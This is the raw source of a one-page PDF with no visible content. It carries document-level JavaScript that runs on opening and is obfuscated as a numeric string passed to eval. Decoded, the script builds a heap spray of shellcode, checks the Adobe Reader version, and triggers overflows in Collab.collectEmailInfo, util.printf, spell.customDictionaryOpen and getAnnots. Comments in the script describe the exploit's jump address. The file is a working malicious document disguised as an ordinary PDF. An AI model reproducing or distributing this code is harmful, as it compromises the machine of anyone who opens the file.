%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 25129>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var d = eval;
var s = "12 120 99 116 34 114 99 123 110 113 99 102 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 50 67 50 67 39 119 50 67 50 67 39 119 50 67 50 67 36 45 36 39 119 71 51 70 59 39 119 53 54 70 59 39 119 55 58 52 54 39 119 55 58 55 58 39 119 53 53 55 58 39 119 68 53 70 68 39 119 50 53 51 69 39 119 53 51 69 53 39 119 56 56 69 59 39 119 71 59 58 51 39 119 72 67 56 55 39 119 53 50 58 50 39 119 54 50 52 51 39 119 72 67 71 52 39 119 51 57 69 59 39 119 52 51 52 52 39 119 54 59 52 51 39 119 50 51 52 51 39 119 52 51 52 51 39 119 52 51 54 68 39 119 72 51 70 71 39 119 52 51 59 58 39 119 52 51 53 51 39 119 67 67 52 51 39 119 69 67 70 59 39 119 57 72 52 54 39 119 58 55 70 52 39 119 72 51 70 71 39 119 70 57 69 59 39 119 70 71 70 71 39 119 69 59 70 71 39 119 52 52 51 69 39 119 52 51 52 51 39 119 70 59 67 67 39 119 51 59 69 59 39 119 52 51 52 51 39 119 69 59 52 51 39 119 52 50 56 69 39 119 52 51 52 51 39 119 56 57 69 59 39 119 52 51 52 51 39 119 69 59 52 51 39 119 52 52 72 67 39 119 52 51 52 51 39 119 70 59 67 67 39 119 50 53 69 59 39 119 52 51 52 51 39 119 69 59 52 51 39 119 52 50 56 55 39 119 52 51 52 51 39 119 51 51 69 59 39 119 52 51 52 51 39 119 69 59 52 51 39 119 52 52 67 58 39 119 52 51 52 51 39 119 70 59 67 67 39 119 52 70 69 59 39 119 52 51 52 51 39 119 69 59 52 51 39 119 52 50 54 50 39 119 52 51 52 51 39 119 53 68 69 59 39 119 52 51 52 51 39 119 69 67 52 51 39 119 57 52 57 59 39 119 72 70 67 67 39 119 54 68 57 52 39 119 54 59 56 51 39 119 53 51 52 51 39 119 52 51 52 51 39 119 69 59 57 56 39 119 52 53 59 50 39 119 52 51 52 51 39 119 69 54 69 59 39 119 52 51 52 51 39 119 57 59 52 51 39 119 57 52 71 52 39 119 72 70 67 67 39 119 54 68 57 52 39 119 54 59 50 51 39 119 53 51 52 51 39 119 52 51 52 51 39 119 69 59 57 56 39 119 52 53 68 58 39 119 52 51 52 51 39 119 71 69 69 59 39 119 52 51 52 51 39 119 57 59 52 51 39 119 57 56 71 52 39 119 51 70 69 59 39 119 52 51 52 55 39 119 67 67 52 51 39 119 51 52 70 59 39 119 56 58 71 58 39 119 71 51 51 52 39 119 71 52 59 51 39 119 70 53 70 70 39 119 67 69 58 72 39 119 70 71 56 56 39 119 71 52 57 71 39 119 51 72 57 67 39 119 52 56 71 57 39 119 51 72 59 59 39 119 57 71 67 58 39 119 54 57 52 50 39 119 71 56 51 72 39 119 52 54 56 56 39 119 69 51 70 71 39 119 69 58 71 52 39 119 52 55 68 54 39 119 52 51 52 51 39 119 67 50 57 67 39 119 53 55 69 70 39 119 52 51 52 50 39 119 67 67 52 51 39 119 51 72 72 55 39 119 52 53 71 56 39 119 54 69 54 52 39 119 50 51 54 55 39 119 71 56 51 72 39 119 52 55 56 53 39 119 54 52 50 71 39 119 50 53 50 51 39 119 71 53 67 52 39 119 51 52 52 59 39 119 57 51 71 51 39 119 54 59 57 51 39 119 52 50 52 55 39 119 52 51 52 51 39 119 57 52 57 53 39 119 69 59 57 51 39 119 52 52 71 50 39 119 52 51 52 51 39 119 72 51 70 71 39 119 70 70 67 67 39 119 71 56 67 67 39 119 71 51 67 52 39 119 51 72 52 59 39 119 53 59 67 68 39 119 72 67 67 55 39 119 52 52 55 55 39 119 69 67 56 51 39 119 51 72 70 57 39 119 52 51 71 57 39 119 51 52 50 53 39 119 51 72 72 53 39 119 57 51 67 59 39 119 67 52 52 50 39 119 57 55 69 70 39 119 71 51 51 52 39 119 72 67 51 52 39 119 71 70 67 67 39 119 70 59 67 52 39 119 55 69 57 55 39 119 51 72 52 58 39 119 53 70 67 58 39 119 67 52 52 50 39 119 52 55 71 51 39 119 70 53 69 67 39 119 71 70 67 67 39 119 72 58 67 67 39 119 71 52 67 52 39 119 51 52 53 51 39 119 51 72 71 51 39 119 56 52 71 56 39 119 52 50 50 70 39 119 52 51 52 51 39 119 57 50 52 51 39 119 57 51 57 52 39 119 57 51 57 51 39 119 57 51 57 51 39 119 57 56 57 51 39 119 69 59 57 51 39 119 52 52 51 58 39 119 52 51 52 51 39 119 53 58 69 59 39 119 52 51 52 51 39 119 54 55 52 51 39 119 52 55 58 50 39 119 52 51 52 51 39 119 67 69 52 51 39 119 54 51 58 51 39 119 70 71 70 71 39 119 69 59 70 71 39 119 52 52 51 56 39 119 52 51 52 51 39 119 72 67 51 52 39 119 57 52 57 52 39 119 57 52 57 52 39 119 72 51 70 71 39 119 51 59 67 51 39 119 67 51 69 59 39 119 69 58 51 59 39 119 52 71 55 54 39 119 55 59 67 50 39 119 68 51 52 54 39 119 68 51 68 51 39 119 55 55 68 51 39 119 57 54 52 57 39 119 69 70 67 67 39 119 56 51 67 69 39 119 70 71 52 54 39 119 69 59 69 51 39 119 70 71 50 72 39 119 70 71 70 71 39 119 69 59 71 52 39 119 70 71 50 59 39 119 70 71 70 71 39 119 53 50 59 59 39 119 52 55 52 50 39 119 71 53 67 51 39 119 52 51 52 70 39 119 53 67 69 59 39 119 70 71 70 71 39 119 51 52 70 71 39 119 57 51 71 51 39 119 69 59 57 55 39 119 52 51 57 55 39 119 52 51 52 51 39 119 69 59 57 51 39 119 52 53 67 67 39 119 52 51 52 51 39 119 72 51 70 71 39 119 67 51 51 57 39 119 50 55 51 70 39 119 55 56 52 51 39 119 69 59 52 68 39 119 52 53 56 50 39 119 52 51 52 51 39 119 70 71 51 52 39 119 70 71 57 56 39 119 69 59 72 51 39 119 52 50 70 67 39 119 52 51 52 51 39 119 70 71 54 59 39 119 52 51 52 51 39 119 70 71 52 51 39 119 69 59 72 51 39 119 70 72 69 59 39 119 70 71 70 71 39 119 57 56 57 52 39 119 51 52 57 57 39 119 57 51 71 51 39 119 69 59 57 55 39 119 52 51 53 72 39 119 52 51 52 51 39 119 69 59 57 51 39 119 52 53 57 54 39 119 52 51 52 51 39 119 72 51 70 71 39 119 67 51 51 57 39 119 50 55 51 70 39 119 55 56 52 51 39 119 69 59 52 68 39 119 52 53 52 67 39 119 52 51 52 51 39 119 70 71 51 52 39 119 70 71 57 56 39 119 57 59 72 51 39 119 57 71 57 72 39 119 71 52 57 67 39 119 52 53 69 67 39 119 71 52 57 59 39 119 70 58 69 59 39 119 70 71 70 71 39 119 57 57 70 71 39 119 67 52 57 56 39 119 52 59 69 70 39 119 70 70 67 67 39 119 52 59 54 68 39 119 51 72 57 56 39 119 55 56 70 71 39 119 69 59 53 55 39 119 52 53 57 69 39 119 52 51 52 51 39 119 72 51 70 71 39 119 70 70 67 67 39 119 54 50 54 59 39 119 54 54 54 69 39 119 54 59 52 51 39 119 56 54 56 58 39 119 55 53 56 57 39 119 70 55 67 67 39 119 52 59 59 58 39 119 52 51 52 51 39 119 70 52 52 51 39 119 55 54 58 57 39 119 54 68 50 71 39 119 51 72 52 51 39 119 55 55 70 71 39 119 50 51 50 55 39 119 50 55 69 59 39 119 52 51 52 53 39 119 70 71 52 51 39 119 67 67 72 51 39 119 69 59 70 59 39 119 52 50 71 67 39 119 52 51 52 51 39 119 72 51 70 71 39 119 70 59 51 67 39 119 52 59 55 55 39 119 67 67 51 57 39 119 50 55 56 55 39 119 51 72 50 51 39 119 52 51 70 71 39 119 70 71 51 72 39 119 50 55 55 55 39 119 69 59 53 70 39 119 52 50 69 71 39 119 52 51 52 51 39 119 72 51 70 71 39 119 71 55 67 52 39 119 57 71 53 51 39 119 59 59 57 72 39 119 52 51 52 50 39 119 52 51 52 51 39 119 54 59 71 52 39 119 54 72 54 71 39 119 52 51 52 51 39 119 55 54 54 59 39 119 54 70 55 53 39 119 69 67 54 69 39 119 67 69 53 54 39 119 50 55 56 55 39 119 57 51 52 55 39 119 50 53 69 59 39 119 70 71 70 72 39 119 57 51 70 71 39 119 56 68 69 59 39 119 52 51 52 53 39 119 69 58 52 51 39 119 70 72 69 53 39 119 70 71 70 71 39 119 69 57 69 59 39 119 70 71 70 71 39 119 67 52 70 71 39 119 52 59 71 55 39 119 54 68 71 52 39 119 54 59 54 70 39 119 55 55 54 72 39 119 54 70 54 55 39 119 53 54 69 67 39 119 56 55 67 69 39 119 52 55 50 55 39 119 69 59 57 51 39 119 70 69 70 67 39 119 70 71 70 71 39 119 69 59 57 51 39 119 52 53 50 52 39 119 52 51 52 51 39 119 59 67 69 58 39 119 70 71 70 72 39 119 69 59 70 71 39 119 70 71 69 57 39 119 70 71 70 71 39 119 71 55 67 52 39 119 71 52 52 59 39 119 51 52 54 59 39 119 52 51 51 53 39 119 54 59 52 51 39 119 55 52 55 54 39 119 55 53 54 54 39 119 53 54 69 67 39 119 56 55 67 69 39 119 52 55 50 55 39 119 69 59 57 51 39 119 70 69 72 50 39 119 70 71 70 71 39 119 69 59 57 51 39 119 52 50 70 58 39 119 52 51 52 51 39 119 68 50 69 58 39 119 70 71 70 72 39 119 69 59 70 71 39 119 70 71 69 57 39 119 70 71 70 71 39 119 71 55 67 52 39 119 71 52 52 59 39 119 54 52 54 59 39 119 55 56 55 57 39 119 54 59 52 51 39 119 54 59 55 52 39 119 54 71 54 55 39 119 53 54 69 67 39 119 56 55 67 69 39 119 52 55 50 55 39 119 69 59 57 51 39 119 70 69 58 56 39 119 70 71 70 71 39 119 69 59 57 51 39 119 52 50 71 71 39 119 52 51 52 51 39 119 54 56 69 58 39 119 70 71 70 72 39 119 69 59 70 71 39 119 70 71 69 57 39 119 70 71 70 71 39 119 71 55 67 52 39 119 71 52 52 59 39 119 55 57 54 59 39 119 55 59 54 56 39 119 69 67 52 51 39 119 67 69 53 54 39 119 50 55 56 55 39 119 57 51 52 55 39 119 67 53 69 59 39 119 70 71 70 69 39 119 57 51 70 71 39 119 58 68 69 59 39 119 52 51 52 50 39 119 69 58 52 51 39 119 70 72 56 53 39 119 70 71 70 71 39 119 69 57 69 59 39 119 70 71 70 71 39 119 67 52 70 71 39 119 52 55 71 55 39 119 69 59 71 52 39 119 52 50 58 67 39 119 52 51 52 51 39 119 53 67 54 59 39 119 56 57 71 57 39 119 57 51 55 58 39 119 71 57 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 68 56 39 119 52 51 52 51 39 119 69 70 54 59 39 119 52 52 68 56 39 119 57 51 52 70 39 119 59 53 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 67 52 39 119 52 51 52 51 39 119 58 68 54 59 39 119 52 69 70 70 39 119 57 51 55 70 39 119 68 72 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 54 71 39 119 52 51 52 51 39 119 69 69 54 59 39 119 69 71 57 57 39 119 57 51 51 57 39 119 67 68 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 57 67 39 119 52 51 52 51 39 119 70 51 54 59 39 119 52 55 67 68 39 119 57 51 57 71 39 119 55 57 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 70 56 39 119 70 71 70 71 39 119 55 59 54 59 39 119 72 67 54 59 39 119 57 51 53 70 39 119 54 53 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 51 52 39 119 52 51 52 51 39 119 69 71 54 59 39 119 69 51 71 72 39 119 57 51 54 51 39 119 56 72 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 50 53 71 39 119 52 51 52 51 39 119 59 51 54 59 39 119 50 69 56 58 39 119 57 51 72 67 39 119 51 68 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 71 51 57 39 119 70 71 70 71 39 119 58 67 54 59 39 119 68 67 57 72 39 119 57 51 53 72 39 119 50 57 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 58 56 39 119 70 71 70 71 39 119 57 58 54 59 39 119 67 50 68 56 39 119 57 51 52 53 39 119 53 53 69 59 39 119 52 51 52 50 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 51 69 52 39 119 52 51 52 51 39 119 55 72 54 59 39 119 69 53 72 59 39 119 57 51 55 52 39 119 70 72 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 51 71 71 39 119 52 51 52 51 39 119 68 72 54 59 39 119 59 67 70 58 39 119 57 51 51 54 39 119 69 68 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 68 53 39 119 70 71 70 71 39 119 57 56 54 59 39 119 59 54 58 51 39 119 57 51 59 67 39 119 72 57 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 55 72 39 119 70 71 70 71 39 119 53 68 54 59 39 119 53 72 55 68 39 119 57 51 52 53 39 119 71 53 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 54 68 39 119 70 71 70 71 39 119 69 51 54 59 39 119 51 51 57 67 39 119 57 51 68 55 39 119 58 72 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 57 57 39 119 70 71 70 71 39 119 68 56 54 59 39 119 69 53 71 58 39 119 57 51 58 52 39 119 68 68 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 56 53 39 119 70 71 70 71 39 119 54 59 54 59 39 119 71 54 50 55 39 119 57 51 59 52 39 119 67 57 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 51 57 56 39 119 52 51 52 51 39 119 55 53 54 59 39 119 59 52 70 72 39 119 57 51 53 57 39 119 55 53 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 70 72 56 55 39 119 70 71 70 71 39 119 53 52 69 67 39 119 54 54 54 68 39 119 69 59 57 51 39 119 70 67 70 56 39 119 70 71 70 71 39 119 69 59 57 51 39 119 70 72 58 67 39 119 70 71 70 71 39 119 59 56 69 58 39 119 70 71 70 70 39 119 69 59 70 71 39 119 70 71 69 59 39 119 70 71 70 71 39 119 69 59 71 52 39 119 70 69 58 58 39 119 70 71 70 71 39 119 56 71 54 59 39 119 56 71 69 71 39 119 57 51 52 54 39 119 51 72 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 69 59 71 52 39 119 52 51 52 71 39 119 52 51 52 51 39 119 67 72 54 59 39 119 52 72 56 72 39 119 57 51 69 70 39 119 50 68 69 59 39 119 52 51 52 51 39 119 67 52 52 51 39 119 52 59 71 55 39 119 51 52 71 52 39 119 54 55 71 51 39 119 56 51 67 67 39 119 67 54 51 51 39 119 55 59 71 51 39 119 51 72 53 51 39 119 56 51 67 67 39 119 51 72 52 70 39 119 55 51 67 67 39 119 58 69 53 70 39 119 67 67 51 72 39 119 52 59 56 51 39 119 69 67 71 52 39 119 51 72 52 67 39 119 56 51 67 67 39 119 67 52 51 55 39 119 55 70 71 51 39 119 67 67 51 72 39 119 51 70 56 51 39 119 54 51 71 52 39 119 67 67 51 57 39 119 50 55 54 70 39 119 51 57 50 55 39 119 56 54 67 67 39 119 51 57 51 70 39 119 57 55 67 67 39 119 55 59 52 54 39 119 72 54 52 52 39 119 67 67 51 72 39 119 53 59 56 68 39 119 67 67 51 72 39 119 50 51 57 68 39 119 72 69 52 52 39 119 51 67 69 52 39 119 51 72 56 58 39 119 51 55 67 67 39 119 52 52 67 67 39 119 51 52 70 54 39 119 51 52 70 71 39 119 70 70 71 51 39 119 67 55 58 70 39 119 55 55 71 51 39 119 71 50 52 56 39 119 52 69 71 71 39 119 70 59 52 52 39 119 70 55 69 67 39 119 51 67 51 57 39 119 50 55 55 70 39 119 55 54 50 59 39 119 51 72 72 71 39 119 57 68 67 67 39 119 52 52 50 55 39 119 54 57 72 69 39 119 67 67 51 72 39 119 56 67 52 70 39 119 67 67 51 72 39 119 53 70 57 68 39 119 72 69 52 52 39 119 67 67 51 72 39 119 67 67 52 55 39 119 71 54 52 52 39 119 67 58 51 57 39 119 50 55 56 55 39 119 54 50 53 70 39 119 69 59 71 52 39 119 70 67 54 57 39 119 70 71 70 71 39 119 55 55 54 59 39 119 55 51 55 55 39 119 50 71 51 68 39 119 54 70 50 71 39 119 54 69 54 56 39 119 54 72 54 58 39 119 54 52 50 72 39 119 54 69 54 71 39 119 54 58 50 71 39 119 54 50 54 69 39 119 54 54 54 56 39 119 54 71 50 71 39 119 54 54 55 54 39 119 50 72 55 55 39 119 54 59 55 51 39 119 52 51 55 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 52 51 52 51 39 119 50 50 52 51 36 43 61 12 49 49 47 47 47 47 47 47 47 12 120 99 116 34 111 103 111 113 116 123 61 12 104 119 112 101 118 107 113 112 34 80 103 121 97 85 101 116 107 114 118 42 114 99 123 110 113 99 102 43 12 125 12 49 49 120 99 116 34 114 99 123 110 113 99 102 61 12 49 49 107 104 42 99 102 113 100 103 59 43 49 49 99 102 113 100 103 34 116 103 99 102 103 116 34 58 34 121 113 116 109 117 34 99 110 117 113 34 121 107 118 106 34 99 114 114 48 117 103 118 86 107 111 103 81 119 118 65 12 49 49 120 99 116 34 117 118 99 116 118 121 107 118 106 34 63 34 99 114 114 48 99 110 103 116 118 42 41 74 107 41 43 61 49 49 116 103 115 119 107 116 103 102 34 104 113 116 34 99 102 113 100 103 59 12 34 120 99 116 34 112 113 114 34 63 34 119 112 103 117 101 99 114 103 42 36 94 39 119 59 50 59 50 94 39 119 59 50 59 50 36 43 61 34 49 49 110 113 112 105 34 112 113 114 34 121 107 110 110 34 99 110 117 113 34 104 113 116 101 103 34 118 106 103 34 99 102 102 116 103 117 117 34 118 113 34 105 113 34 118 113 34 50 122 59 50 59 50 59 50 59 50 34 117 113 34 52 34 117 118 103 114 117 34 107 112 34 113 112 103 34 61 43 12 34 120 99 116 34 117 106 103 110 110 101 113 102 103 34 63 34 114 99 123 110 113 99 102 61 12 34 121 106 107 110 103 42 112 113 114 48 110 103 112 105 118 106 34 62 63 34 50 122 51 50 50 50 50 50 49 52 43 34 112 113 114 45 63 112 113 114 61 12 34 112 113 114 63 112 113 114 48 117 119 100 117 118 116 107 112 105 42 50 46 50 122 51 50 50 50 50 50 49 52 34 47 34 117 106 103 110 110 101 113 102 103 48 110 103 112 105 118 106 43 61 12 34 111 103 111 113 116 123 63 112 103 121 34 67 116 116 99 123 42 43 61 12 34 104 113 116 42 107 63 50 61 107 62 50 122 56 104 104 50 61 107 45 45 43 34 49 49 121 103 34 117 106 113 119 110 102 34 99 118 34 110 103 99 117 118 34 113 120 103 116 121 116 107 118 103 34 50 122 59 50 59 50 59 50 59 50 12 34 125 111 103 111 113 116 123 93 107 95 63 112 113 114 34 45 34 117 106 103 110 110 101 113 102 103 61 127 12 49 49 117 118 99 116 118 34 103 122 114 110 113 107 118 34 112 113 121 12 117 118 99 116 118 42 43 61 12 104 119 112 101 118 107 113 112 34 117 118 99 116 118 52 42 43 12 125 12 34 118 106 107 117 48 105 103 118 67 112 112 113 118 117 42 47 51 53 54 52 51 57 57 52 58 46 47 51 53 54 52 51 57 57 52 58 46 47 51 53 54 52 51 57 57 52 58 46 47 51 53 54 52 51 57 57 52 58 43 61 12 127 12 104 119 112 101 118 107 113 112 34 117 118 99 116 118 42 43 12 125 12 118 106 107 117 48 117 114 103 110 110 48 101 119 117 118 113 111 70 107 101 118 107 113 112 99 116 123 81 114 103 112 42 50 46 112 113 114 43 61 49 49 117 113 34 118 106 103 34 103 122 114 110 113 107 118 34 108 119 111 114 117 34 99 101 118 119 99 110 110 123 34 118 113 34 50 122 59 50 59 50 59 50 59 50 48 34 82 110 99 101 103 34 99 34 120 103 116 123 34 110 113 112 105 34 41 67 67 67 67 41 34 99 118 34 118 106 103 34 117 103 101 113 112 102 34 114 99 116 99 111 34 118 113 34 105 113 34 118 113 34 50 122 54 51 54 51 54 51 54 51 34 61 43 12 127 12 127 12 49 49 47 47 47 47 47 47 47 12 120 99 116 34 99 116 116 123 34 63 34 112 103 121 34 67 116 116 99 123 42 43 61 12 104 119 112 101 118 107 113 112 34 104 107 122 97 107 118 42 123 99 116 117 114 46 34 110 103 112 43 12 125 34 12 121 106 107 110 103 34 42 123 99 116 117 114 48 110 103 112 105 118 106 44 52 62 110 103 112 43 125 123 99 116 117 114 34 45 63 34 123 99 116 117 114 61 127 34 12 123 99 116 117 114 34 63 34 123 99 116 117 114 48 117 119 100 117 118 116 107 112 105 42 50 46 110 103 112 49 52 43 61 12 116 103 118 119 116 112 34 123 99 116 117 114 61 34 12 127 12 120 99 116 34 120 103 116 117 107 113 112 34 63 34 99 114 114 48 120 107 103 121 103 116 88 103 116 117 107 113 112 61 12 107 104 34 42 120 103 116 117 107 113 112 34 64 34 58 43 34 12 125 12 120 99 116 34 114 99 123 110 113 99 102 61 12 112 113 114 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 50 67 50 67 39 119 50 67 50 67 39 119 50 67 50 67 39 119 50 67 50 67 36 43 12 106 103 99 114 100 110 113 101 109 34 63 34 112 113 114 34 45 34 114 99 123 110 113 99 102 61 12 100 107 105 100 110 113 101 109 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 50 67 50 67 39 119 50 67 50 67 36 43 61 12 106 103 99 102 103 116 117 107 124 103 34 63 34 52 50 61 12 117 114 116 99 123 34 63 34 106 103 99 102 103 116 117 107 124 103 45 106 103 99 114 100 110 113 101 109 48 110 103 112 105 118 106 61 12 121 106 107 110 103 34 42 100 107 105 100 110 113 101 109 48 110 103 112 105 118 106 62 117 114 116 99 123 43 34 100 107 105 100 110 113 101 109 45 63 100 107 105 100 110 113 101 109 61 12 104 107 110 110 100 110 113 101 109 34 63 34 100 107 105 100 110 113 101 109 48 117 119 100 117 118 116 107 112 105 42 50 46 34 117 114 116 99 123 43 61 12 100 110 113 101 109 34 63 34 100 107 105 100 110 113 101 109 48 117 119 100 117 118 116 107 112 105 42 50 46 34 100 107 105 100 110 113 101 109 48 110 103 112 105 118 106 47 117 114 116 99 123 43 61 12 121 106 107 110 103 42 100 110 113 101 109 48 110 103 112 105 118 106 45 117 114 116 99 123 34 62 34 50 122 54 50 50 50 50 43 34 100 110 113 101 109 34 63 34 100 110 113 101 109 45 100 110 113 101 109 45 104 107 110 110 100 110 113 101 109 61 12 111 103 111 34 63 34 112 103 121 34 67 116 116 99 123 42 43 61 12 34 104 113 116 34 42 107 63 50 61 107 62 51 54 50 50 61 107 45 45 43 34 111 103 111 93 107 95 34 63 34 100 110 113 101 109 34 45 34 106 103 99 114 100 110 113 101 109 61 12 120 99 116 34 112 119 111 34 63 34 51 52 59 59 59 59 59 59 59 59 59 59 59 59 59 59 59 59 59 59 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 61 12 119 118 107 110 48 114 116 107 112 118 104 42 36 39 54 55 50 50 50 104 36 46 112 119 111 43 61 12 127 12 107 104 34 42 120 103 116 117 107 113 112 34 62 34 58 43 12 125 12 120 99 116 34 114 99 123 110 113 99 102 61 12 120 99 116 34 111 103 111 97 99 116 116 99 123 34 63 34 112 103 121 34 67 116 116 99 123 42 43 61 12 120 99 116 34 101 101 34 63 34 50 122 50 101 50 101 50 101 50 101 61 12 120 99 116 34 99 102 102 116 34 63 34 50 122 54 50 50 50 50 50 61 12 120 99 116 34 117 101 97 110 103 112 34 63 34 114 99 123 110 113 99 102 48 110 103 112 105 118 106 34 44 34 52 61 12 120 99 116 34 110 103 112 34 63 34 99 102 102 116 34 47 34 42 117 101 97 110 103 112 45 50 122 53 58 43 61 12 120 99 116 34 123 99 116 117 114 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 59 50 59 50 39 119 59 50 59 50 36 43 61 12 123 99 116 117 114 34 63 34 104 107 122 97 107 118 42 123 99 116 117 114 46 34 110 103 112 43 61 12 120 99 116 34 101 113 119 112 118 52 34 63 34 42 101 101 34 47 34 50 122 54 50 50 50 50 50 43 49 99 102 102 116 61 12 104 113 116 34 42 120 99 116 34 101 113 119 112 118 63 50 61 101 113 119 112 118 62 101 113 119 112 118 52 61 101 113 119 112 118 45 45 43 12 125 12 34 111 103 111 97 99 116 116 99 123 93 101 113 119 112 118 95 34 63 34 123 99 116 117 114 34 45 34 114 99 123 110 113 99 102 61 12 127 12 120 99 116 34 113 120 103 116 104 110 113 121 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 50 101 50 101 39 119 50 101 50 101 36 43 61 12 121 106 107 110 103 42 113 120 103 116 104 110 113 121 48 110 103 112 105 118 106 34 62 34 54 54 59 55 52 43 34 113 120 103 116 104 110 113 121 34 45 63 34 113 120 103 116 104 110 113 121 61 12 118 106 107 117 48 101 113 110 110 99 100 85 118 113 116 103 34 63 34 69 113 110 110 99 100 48 101 113 110 110 103 101 118 71 111 99 107 110 75 112 104 113 42 125 117 119 100 108 60 34 36 36 46 111 117 105 60 34 113 120 103 116 104 110 113 121 127 43 61 12 127 12 107 104 34 42 120 103 116 117 107 113 112 34 62 34 59 48 51 43 12 125 12 107 104 34 42 99 114 114 48 102 113 101 48 69 113 110 110 99 100 48 105 103 118 75 101 113 112 43 125 12 34 120 99 116 34 114 99 123 110 113 99 102 61 12 34 120 99 116 34 106 89 115 55 50 50 69 80 34 63 34 114 99 123 110 113 99 102 48 110 103 112 105 118 106 34 44 34 52 61 12 34 120 99 116 34 110 103 112 34 63 34 50 122 54 50 50 50 50 50 34 47 34 42 106 89 115 55 50 50 69 80 34 45 34 50 122 53 58 43 61 12 34 120 99 116 34 123 99 116 117 114 34 63 34 119 112 103 117 101 99 114 103 42 36 39 119 59 50 59 50 39 119 59 50 59 50 36 43 61 12 34 123 99 116 117 114 34 63 34 104 107 122 97 107 118 42 123 99 116 117 114 46 34 110 103 112 43 61 12 34 120 99 116 34 114 55 67 108 77 56 55 104 34 63 34 42 50 122 50 101 50 101 50 101 50 101 34 47 34 50 122 54 50 50 50 50 50 43 34 49 34 50 122 54 50 50 50 50 50 61 12 34 104 113 116 34 42 120 99 116 34 120 115 101 83 70 59 56 123 34 63 34 50 61 34 120 115 101 83 70 59 56 123 34 62 34 114 55 67 108 77 56 55 104 61 34 120 115 101 83 70 59 56 123 34 45 45 34 43 125 12 34 